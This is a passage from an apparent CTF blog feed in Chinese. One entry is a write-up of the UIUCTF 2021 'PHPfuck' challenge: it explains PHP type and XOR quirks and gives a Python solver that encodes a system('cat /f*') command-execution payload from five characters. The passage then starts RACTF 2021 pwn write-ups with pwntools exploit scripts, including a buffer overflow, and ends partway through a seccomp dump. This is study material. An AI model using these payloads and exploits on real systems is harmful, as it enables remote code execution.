id="双标的"><a href="#双标的" class="headerlink" title="双标的."></a>双标的<code>.</code></h3><p>在php中，<code>.</code>号又对于两个字符串间有连接的作用</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var_dump(<span class="string">'le'</span>.<span class="string">'xsd6'</span>) <span class="comment">#string(6) "lexsd6"</span></span><br></pre></td></tr></table></figure><p>对两个数字间的<code>.</code>号，php会将他们看作是小数关系</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var_dump(1.2) #float(1.2)</span><br></pre></td></tr></table></figure><p>但，如把<code>.</code>号附近的数字用括号括起来php会把他们进行字符串般的对待</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var_dump((<span class="number">1</span>));<span class="comment">#int(1)</span></span><br><span class="line">var_dump((<span class="number">2</span>));<span class="comment">#int(2)</span></span><br><span class="line">var_dump((<span class="number">1</span>).(<span class="number">2</span>));<span class="comment">#string(2) "12"</span></span><br></pre></td></tr></table></figure><p>同时由于php对于大于309长度的数字转化为<code>INF</code>,<code>INF</code>与<code>(9)</code>同连接符号<code>.</code>得到string  <code>&quot;INF9&quot;</code>。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var_dump(<span class="number">999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999</span>);</span><br><span class="line"><span class="comment"># float(INF)</span></span><br><span class="line">var_dump((<span class="number">999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999</span>).(<span class="number">9</span>));</span><br><span class="line"><span class="comment"># string(4) "INF9"</span></span><br></pre></td></tr></table></figure><h3 id="奇怪的"><a href="#奇怪的" class="headerlink" title="奇怪的^"></a>奇怪的<code>^</code></h3><p>由于php变量的特性。在进行<code>^</code>操作时，其结果也有些微妙变化。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">var_dump(<span class="string">'9'</span>^(<span class="number">1</span>)); <span class="comment">#int(8)</span></span><br><span class="line">var_dump(<span class="string">'9'</span>^<span class="string">'1'</span>);<span class="comment">#string(1) ""</span></span><br><span class="line">var_dump(<span class="string">'9'</span>^<span class="number">1</span>)<span class="comment">#;int(8)</span></span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">var_dump(<span class="string">'99'</span>^(<span class="number">1</span>));<span class="comment">#int(98)</span></span><br><span class="line">var_dump(<span class="string">'99'</span>^<span class="string">'1'</span>);<span class="comment">#string(1) ""</span></span><br><span class="line">var_dump(<span class="string">'99'</span>^<span class="number">1</span>);<span class="comment">#int(98)</span></span><br><span class="line"></span><br><span class="line">var_dump(<span class="string">'99'</span>^(<span class="number">11</span>));<span class="comment">#int(104)</span></span><br><span class="line">var_dump(<span class="string">'99'</span>^<span class="string">'11'</span>);<span class="comment">#string(2) ""</span></span><br><span class="line">var_dump(<span class="string">'99'</span>^<span class="number">11</span>);<span class="comment">#int(104)</span></span><br><span class="line"></span><br><span class="line">var_dump(<span class="string">'c'</span>^<span class="number">11</span>);<span class="comment">#int(11)</span></span><br><span class="line">var_dump(<span class="string">'c'</span>^<span class="string">'11'</span>);<span class="comment">#string(1) "R"</span></span><br><span class="line">var_dump(<span class="string">'c'</span>^(<span class="number">11</span>));<span class="comment">#int(11)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">var_dump(<span class="string">'cc'</span>^<span class="number">11</span>);<span class="comment">#int(11)</span></span><br><span class="line">var_dump(<span class="string">'cc'</span>^<span class="string">'11'</span>);<span class="comment">#string(2) "RR"</span></span><br><span class="line">var_dump(<span class="string">'cc'</span>^(<span class="number">11</span>));<span class="comment">#int(11)</span></span><br></pre></td></tr></table></figure><p>可以上看到几点：</p><ol><li>数字字符串（string型数字，如上：’99’.’9’）在与int数字进行<code>^</code>操作时，会把两者都视为int数字来进行操作。所以<code>&#39;9&#39;^(1)</code>实际上是<code>9^1</code>而不是<code>&#39;\x39&#39;^1</code>.</li><li>两不同字符串相<code>^</code>时，结果字符串长度跟原字符串两者中最小字符串长度的字符相等。(例:<code>&#39;c&#39;^&#39;11&#39; == &quot;R&quot;</code>)</li><li>字符字符串与int数字相与时，结果为原来int数字</li></ol><h3 id="小数四舍五入"><a href="#小数四舍五入" class="headerlink" title="小数四舍五入"></a>小数四舍五入</h3><p>在php中会把<code>.99</code>自动看成是小数<code>0.99</code>。</p><p>同当一个浮点数的小数位大于<code>.99999999999999999995</code>时，会自动变成进一位。小于会丢弃最后一位：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">var_dump(<span class="number">.999999999999994</span>);<span class="comment">#float(0.99999999999999)</span></span><br><span class="line">var_dump(<span class="number">.999999999999995</span>);<span class="comment">#float(1)</span></span><br><span class="line">var_dump(<span class="number">.999999999999999</span>);<span class="comment">#float(1)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">var_dump(<span class="number">3.99999999999994</span>);<span class="comment">#float(3.9999999999999)</span></span><br><span class="line">var_dump(<span class="number">3.99999999999995</span>);<span class="comment">#float(3.9999999999999)</span></span><br><span class="line">var_dump(<span class="number">3.999999999999955</span>);<span class="comment">#float(4)</span></span><br><span class="line">var_dump(<span class="number">3.99999999999996</span>);<span class="comment">#float(4)</span></span><br><span class="line">var_dump(<span class="number">3.99999999999999</span>);<span class="comment">#float(4)</span></span><br></pre></td></tr></table></figure><h2 id="构造思路"><a href="#构造思路" class="headerlink" title="构造思路"></a>构造思路</h2><h3 id="构造任意数字"><a href="#构造任意数字" class="headerlink" title="构造任意数字"></a>构造任意数字</h3><p>由于上面的特性,我们可以用<code>9(^).</code>这个字符简单的构造些数字如:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'106'</span>:<span class="string">'(99^9)'</span>,</span><br><span class="line"><span class="string">'99'</span>:<span class="string">'(99)'</span>,</span><br><span class="line"><span class="string">'19'</span>:<span class="string">'(((.99999999999999999999).(9))^(9)^(9))'</span>,</span><br><span class="line"><span class="string">'7'</span>:<span class="string">'(99.999999999999999999^99)'</span>,</span><br><span class="line"><span class="string">'3'</span>:<span class="string">'(9.9999999999999999999^9)'</span>,</span><br><span class="line"><span class="string">'1'</span>:<span class="string">'(.99999999999999999999)'</span>,</span><br><span class="line"><span class="string">'0'</span>:<span class="string">'(9^9)'</span>,</span><br><span class="line"><span class="string">'9'</span>:<span class="string">'(9)'</span>,</span><br></pre></td></tr></table></figure><p>我们再让这些数字相互<code>^</code>进而得到所有的单字符数字(<code>0-9</code>)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#39;1&#39;: &#39;(.99999999999999999999)&#39;, </span><br><span class="line">&#39;0&#39;: &#39;(9^9)&#39;, </span><br><span class="line">3&#39;: &#39;(9.9999999999999999999^9)&#39;, </span><br><span class="line">&#39;2&#39;: &#39;((9.9999999999999999999^9)^(.99999999999999999999))&#39;, </span><br><span class="line">&#39;5&#39;:&#39;(((99.999999999999999999^99)^(9.9999999999999999999^9))^(.99999999999999999999))&#39;, </span><br><span class="line">&#39;4&#39;: &#39;((99.999999999999999999^99)^(9.9999999999999999999^9))&#39;,</span><br><span class="line">&#39;7&#39;: &#39;(99.999999999999999999^99)&#39;,</span><br><span class="line">&#39;6&#39;: &#39;((99.999999999999999999^99)^(.99999999999999999999))&#39;, </span><br><span class="line">&#39;9&#39;: &#39;(9)&#39;, </span><br><span class="line">&#39;8&#39;: &#39;((9)^(.99999999999999999999))&#39;&#125;</span><br></pre></td></tr></table></figure><h3 id="通过可变函数构造任意字符"><a href="#通过可变函数构造任意字符" class="headerlink" title="通过可变函数构造任意字符"></a>通过可变函数构造任意字符</h3><h4 id="可变函数"><a href="#可变函数" class="headerlink" title="可变函数"></a>可变函数</h4><p>在php高版本中我们可以通过字符串+<code>(变量)</code>的方式来调用函数.例:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(<span class="string">'phpinfo'</span>)()<span class="comment">#phpinfo()</span></span><br><span class="line">(<span class="string">'syStem'</span>)(<span class="string">'ls'</span>)<span class="comment">#system('ls')</span></span><br></pre></td></tr></table></figure><p>同时，由于php函数名是不区分大小的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chr() ==CHr()</span><br><span class="line"><span class="string">'cHr'</span>()=chr()</span><br></pre></td></tr></table></figure><p>我们只要构造出<code>C/c</code>、<code>H/h</code>、<code>R/r</code>就可以调用<code>chr</code>从而构造任意字符。</p><h4 id="构造chr"><a href="#构造chr" class="headerlink" title="构造chr"></a>构造chr</h4><p>我们可以通过<code>&#39;INF9&#39;</code>,构造出不分大小写的<code>chr</code>.</p><p>经过test后发现:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#39;I&#39;^&#39;3&#39;^&#39;9&#39; &#x3D;&#x3D;&#39;C&#39;</span><br><span class="line">&#39;N&#39;^&#39;1&#39;^&#39;7&#39;&#x3D;&#39;H&#39;</span><br><span class="line">&#39;F&#39;^&#39;4&#39; &#x3D;&#x3D;&#39;r&#39;</span><br></pre></td></tr></table></figure><p>于是我们可以让：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(‘INF‘.(<span class="number">9</span>))^(<span class="string">'314'</span>)^(<span class="string">'97\X00X00'</span>)==<span class="string">'CHr'</span>;</span><br><span class="line"><span class="comment">#即</span></span><br><span class="line"><span class="string">'CHr'</span>==((((<span class="number">999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999</span>).(<span class="number">9</span>))^((<span class="number">9.9999999999999999999</span>^<span class="number">9</span>).(<span class="number">.99999999999999999999</span>).((<span class="number">99.999999999999999999</span>^<span class="number">99</span>)^(<span class="number">9.9999999999999999999</span>^<span class="number">9</span>))))^((<span class="number">9</span>).(<span class="number">99.999999999999999999</span>^<span class="number">99</span>).(((<span class="number">9</span>).(<span class="number">9</span>))^((<span class="number">9</span>).(<span class="number">9</span>)))));</span><br></pre></td></tr></table></figure><h2 id="解题脚本"><a href="#解题脚本" class="headerlink" title="解题脚本"></a>解题脚本</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#python2</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line">def init():</span><br><span class="line">    num=&#123;</span><br><span class="line">        <span class="string">'106'</span>:<span class="string">'(99^9)'</span>,</span><br><span class="line">        <span class="string">'99'</span>:<span class="string">'(99)'</span>,</span><br><span class="line">        <span class="string">'19'</span>:<span class="string">'(((.99999999999999999999).(9))^(9)^(9))'</span>,</span><br><span class="line">        <span class="string">'7'</span>:<span class="string">'(99.999999999999999999^99)'</span>,</span><br><span class="line">        <span class="string">'3'</span>:<span class="string">'(9.9999999999999999999^9)'</span>,</span><br><span class="line">        <span class="string">'1'</span>:<span class="string">'(.99999999999999999999)'</span>,</span><br><span class="line">        <span class="string">'0'</span>:<span class="string">'(9^9)'</span>,</span><br><span class="line">        <span class="string">'9'</span>:<span class="string">'(9)'</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> y in range(<span class="number">3</span>):</span><br><span class="line">        key=num.keys()</span><br><span class="line">        <span class="keyword">for</span> i in range(len(key)):</span><br><span class="line">            <span class="keyword">for</span> x  in range(len(key)):</span><br><span class="line">                k=(int(key[x])^int(key[i]))</span><br><span class="line">                <span class="keyword">if</span> num.has_key(str(k))== <span class="keyword">False</span>:</span><br><span class="line">                    num[str(k)]=<span class="string">'('</span>+num[key[x]]+<span class="string">'^'</span>+num[key[i]]+<span class="string">')'</span></span><br><span class="line">    <span class="keyword">return</span> num</span><br><span class="line"></span><br><span class="line">def one_num(num):</span><br><span class="line">    onum=&#123;&#125;</span><br><span class="line">    key=num.keys()</span><br><span class="line">    <span class="keyword">for</span> i in range(len(key)):</span><br><span class="line">        <span class="keyword">if</span> len(key[i])==<span class="number">1</span>:</span><br><span class="line">            onum[(key[i])]=num[key[i]]</span><br><span class="line">    <span class="keyword">return</span> onum</span><br><span class="line">def get_null(long=<span class="number">1</span>):</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">null</span>=<span class="string">'11'</span></span><br><span class="line"></span><br><span class="line">def chrstr(I,N,F):</span><br><span class="line">    <span class="keyword">global</span> int_num</span><br><span class="line">    I=I.split(<span class="string">'^'</span>)</span><br><span class="line">    N=N.split(<span class="string">'^'</span>)</span><br><span class="line">    F=F.split(<span class="string">'^'</span>)</span><br><span class="line">    MAX_num=max(len(I),len(N),len(F))</span><br><span class="line">    num=int_num</span><br><span class="line">    num[<span class="string">'null'</span>]=<span class="string">'(((9).(9))^((9).(9)))'</span></span><br><span class="line">    ret=<span class="string">'((999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999).(9))'</span></span><br><span class="line">    <span class="comment">#print(I,N,F)</span></span><br><span class="line">    <span class="keyword">if</span> len(F)&lt;MAX_num:</span><br><span class="line">        </span><br><span class="line">            F.append(<span class="string">'null'</span>)</span><br><span class="line">    <span class="keyword">for</span> i in range(MAX_num):</span><br><span class="line">        ret=<span class="string">'('</span>+ret+<span class="string">"^("</span>+int_num[I[i]]+<span class="string">"."</span>+int_num[N[i]]+<span class="string">"."</span>+int_num[F[i]]+<span class="string">"))"</span></span><br><span class="line">    <span class="comment">#print(ret)</span></span><br><span class="line">    <span class="keyword">return</span> ret</span><br><span class="line">    <span class="comment">#print(result)</span></span><br><span class="line">def guess_chr():</span><br><span class="line">    <span class="keyword">global</span> int_num</span><br><span class="line">    num=int_num</span><br><span class="line">    I_test=&#123;&#125;</span><br><span class="line">    N_test=&#123;&#125;</span><br><span class="line">    F_test=&#123;&#125;</span><br><span class="line">    want=<span class="string">'chr'</span></span><br><span class="line">    want=want.upper()</span><br><span class="line">    num_int=num.keys()</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> x in num_int:</span><br><span class="line">        <span class="keyword">for</span> y in num_int:</span><br><span class="line">                k=(chr(ord(<span class="string">'I'</span>)^ord(x)^ord(y)))</span><br><span class="line">                <span class="keyword">if</span> I_test.has_key(k)== <span class="keyword">False</span>:</span><br><span class="line">                     I_test[k]=(x)+<span class="string">'^'</span>+(y)</span><br><span class="line">                k=(chr(ord(<span class="string">'N'</span>)^ord(x)^ord(y)))</span><br><span class="line">                <span class="keyword">if</span> N_test.has_key(k)== <span class="keyword">False</span>:</span><br><span class="line">                     N_test[k]=(x)+<span class="string">'^'</span>+(y)</span><br><span class="line">                k=(chr(ord(<span class="string">'F'</span>)^ord(x)^ord(y)))</span><br><span class="line">                <span class="keyword">if</span> F_test.has_key(k)== <span class="keyword">False</span>:</span><br><span class="line">                     F_test[k]=(x)+<span class="string">'^'</span>+(y)</span><br><span class="line">    <span class="keyword">for</span> x in num_int:</span><br><span class="line">       </span><br><span class="line">                k=(chr(ord(<span class="string">'I'</span>)^ord(x)))</span><br><span class="line">                <span class="keyword">if</span> I_test.has_key(k)== <span class="keyword">False</span>:</span><br><span class="line">                    I_test[k.upper()]=(x)</span><br><span class="line">                k=(chr(ord(<span class="string">'N'</span>)^ord(x)))</span><br><span class="line">                <span class="keyword">if</span> N_test.has_key(k)== <span class="keyword">False</span>:</span><br><span class="line">                    N_test[k.upper()]=(x)</span><br><span class="line">                k=(chr(ord(<span class="string">'F'</span>)^ord(x)))</span><br><span class="line">                <span class="keyword">if</span> F_test.has_key(k)== <span class="keyword">False</span>:</span><br><span class="line">                     F_test[k.upper()]=(x)</span><br><span class="line">    <span class="keyword">if</span> I_test.has_key(want[<span class="number">0</span>])== <span class="keyword">False</span>:</span><br><span class="line">            <span class="keyword">print</span>(<span class="string">'I not much'</span>)</span><br><span class="line">            <span class="keyword">exit</span>()</span><br><span class="line">   </span><br><span class="line">           </span><br><span class="line">    <span class="keyword">if</span> N_test.has_key(want[<span class="number">1</span>])== <span class="keyword">False</span>:</span><br><span class="line">            <span class="keyword">print</span>(<span class="string">'N not much'</span>)</span><br><span class="line">            <span class="keyword">exit</span>()</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span> F_test.has_key(want[<span class="number">2</span>])== <span class="keyword">False</span>:</span><br><span class="line">            <span class="keyword">print</span>(<span class="string">'F not much'</span>)</span><br><span class="line">            <span class="keyword">exit</span>()</span><br><span class="line"></span><br><span class="line">    <span class="comment">#print(F_test)</span></span><br><span class="line">    <span class="keyword">return</span> chrstr(I_test[want[<span class="number">0</span>]],N_test[want[<span class="number">1</span>]],F_test[want[<span class="number">2</span>]])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def guess(want):</span><br><span class="line">    <span class="keyword">global</span> int_num</span><br><span class="line">    want=str(ord(want))</span><br><span class="line">    ret=<span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i in want:</span><br><span class="line">        ret+=int_num[i]+<span class="string">'.'</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ret[:<span class="number">-1</span>]</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">def shell(fun,code):<span class="comment">#有参数函数</span></span><br><span class="line">    ret=<span class="string">''</span></span><br><span class="line">    sym=[<span class="string">'('</span>,<span class="string">'^'</span>,<span class="string">'.'</span>,<span class="string">')'</span>]</span><br><span class="line">    <span class="keyword">global</span> chr_str</span><br><span class="line">    <span class="keyword">for</span> i in fun:</span><br><span class="line">        </span><br><span class="line">            ret+=chr_str+<span class="string">'('</span>+guess(i)+<span class="string">').'</span></span><br><span class="line">            </span><br><span class="line">    ret=<span class="string">"("</span>+ret[:<span class="number">-1</span>]+<span class="string">')(('</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> x in code:</span><br><span class="line">        </span><br><span class="line">            ret+=chr_str+<span class="string">'('</span>+guess(x)+<span class="string">').'</span></span><br><span class="line">            </span><br><span class="line"></span><br><span class="line">    ret=ret[:<span class="number">-1</span>]+<span class="string">'))'</span></span><br><span class="line">    <span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line">def code(xx):<span class="comment">#无差数函数</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> x in xx:</span><br><span class="line">        </span><br><span class="line">            ret+=chr_str+<span class="string">'('</span>+guess(x)+<span class="string">').'</span></span><br><span class="line">            </span><br><span class="line"></span><br><span class="line">    ret=ret[:<span class="number">-1</span>]+<span class="string">'))'</span></span><br><span class="line">    <span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ ==<span class="string">'__main__'</span>:</span><br><span class="line"></span><br><span class="line">    num=init()</span><br><span class="line">    int_num=one_num(num)</span><br><span class="line">    chr_str=guess_chr()</span><br><span class="line">    x=(shell(<span class="string">'assert'</span>,<span class="string">'system("cat /f*")'</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span>(x)</span><br><span class="line">    <span class="keyword">print</span>(len(x))</span><br></pre></td></tr></table></figure><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>勉强完成出解题的脚本，但是一直在思考一个问题.在高版本php中,assert和eval是不可作为可变函数的,那么还有没有什么方法来进行代码执行.</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;2021_uiuctf中出了一道jali题PHPfuck,题目要求用5种字符构造出php shellcode,感觉很有意思便记录下来。</summary>
    
    
    
    <category term="CTF" scheme="lexsd6.github.io/categories/CTF/"/>
    
    
    <category term="php" scheme="lexsd6.github.io/tags/php/"/>
    
    <category term="web" scheme="lexsd6.github.io/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>ractf2021-pwn-ctf</title>
    <link href="lexsd6.github.io/2021/08/17/ractf2021-pwn-ctf/"/>
    <id>lexsd6.github.io/2021/08/17/ractf2021-pwn-ctf/</id>
    <published>2021-08-17T15:07:16.917Z</published>
    <updated>2021-08-17T16:21:36.003Z</updated>
    
    <content type="html"><![CDATA[<p>周末小打了下ractf,get 到了一些 小姿势,于是小记下避免搞忘了。<a id="more"></a></p><h2 id="archer"><a href="#archer" class="headerlink" title="archer"></a>archer</h2><p>简单的变量覆盖…</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> libcfind</span><br><span class="line"></span><br><span class="line">elf=<span class="string">'archer'</span></span><br><span class="line">e=ELF(elf)</span><br><span class="line">p=remote(<span class="string">'193.57.159.27'</span>,<span class="number">49723</span>)</span><br><span class="line"><span class="comment">#p=process(elf)</span></span><br><span class="line">p.sendline(<span class="string">'yes1'</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.sendline(<span class="string">'-fbf98'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="ret2winrars"><a href="#ret2winrars" class="headerlink" title="ret2winrars"></a>ret2winrars</h2><p>签到，elf内自带后门。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> libcfind</span><br><span class="line"></span><br><span class="line">elf=<span class="string">'./ret2winrars'</span></span><br><span class="line">e=ELF(elf)</span><br><span class="line">p=remote(<span class="string">'193.57.159.27'</span>,<span class="number">30527</span>)</span><br><span class="line"><span class="comment">#process(elf)</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.sendline(<span class="number">0x20</span>*<span class="string">'1'</span>+<span class="string">'2'</span>*<span class="number">8</span>+p64(<span class="number">0x000000000401166</span>))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="notsimple"><a href="#notsimple" class="headerlink" title="notsimple"></a>notsimple</h2><p>很有意思的一道题,flag是文件名，同时seccomp 禁用execve所以无法使用命令执行。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A &#x3D; arch</span><br><span class="line"> 0001: 0x15 0x00 0x0b 0xc000003e  if (A !&#x3D; ARCH_X86_64) goto 0013</span><br><span class="line"> 0002: 0x20 0x00 0x00 0x00000000  A &#x3D; sys_number</span><br><span class="line"> 0003: 0x35 0x09 0x00 0x40000000  if (A &gt;&#x3D; 0x40000000) goto 0013</span><br><span class="line"> 0004: 0x15 0x08 0x00 0x0000003b  if (A &#x3D;&#x3D; execve) goto 0013</span><br><span class="line"> 0005: 0x15 0x07 0x00 0x00000142  if (A &#x3D;&#x3D; execveat) goto 0013</span><br><span class="line"> 0006: 0x15 0x06 0x00 0x00000101  if (A &#x3D;&#x3D; openat) goto 0013</span><br><span class="line"> 0007: 0x15 0x05 0x00 0x00000003  if (A &#x3D;&#x3D; close) goto 0013</span><br><span class="line"> 0008: 0x15 0x04 0x00 0x00000055  if (A &#x3D;&#x3D; creat) goto 0013</span><br><span class="line"> 0009: 0x15 0x03 